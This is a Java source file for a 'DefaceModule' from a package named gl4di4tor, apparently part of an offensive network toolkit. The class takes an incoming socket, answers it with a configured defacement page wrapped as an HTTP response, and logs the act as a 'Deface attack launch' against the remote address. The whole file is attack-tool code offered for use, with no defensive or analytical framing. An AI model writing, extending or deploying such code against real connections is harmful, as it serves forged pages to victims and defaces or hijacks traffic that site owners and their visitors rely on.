package gl4di4tor.module.deface;

import gl4di4tor.configuration.Config;
import gl4di4tor.log.LogService;
import gl4di4tor.module.BaseModule;
import gl4di4tor.net.http.HttpResponseMaker;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import java.nio.file.NoSuchFileException;

/**
 * Created by Gladiator on 7/29/2017 AD.
 */
public class DefaceModule extends BaseModule {


    public DefaceModule(Socket socket) {
        super(socket);
    }

    @Override
    public void execute() {
        try {
            DataInputStream in = new DataInputStream(this.socket.getInputStream());
            DataOutputStream out = new DataOutputStream(this.socket.getOutputStream());

            out.writeUTF(HttpResponseMaker.makeHttpResponse(Config.getInstance().getDefacePage()));
            out.flush();
            this.socket.close();
        }catch (NoSuchFileException e) {
            try {
                LogService.error(Config.getInstance().getDefacePage() + " not find.");
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        } catch (Exception e) {
            LogService.error(e);
        }
    }

    @Override
    public void run() {
        try {
            LogService.info("Deface attack launch for " + this.socket.getRemoteSocketAddress() + " using deface page : " +
                    Config.getInstance().getDefacePage());
        } catch (Exception e) {
            e.printStackTrace();
        }
        execute();
    }
}
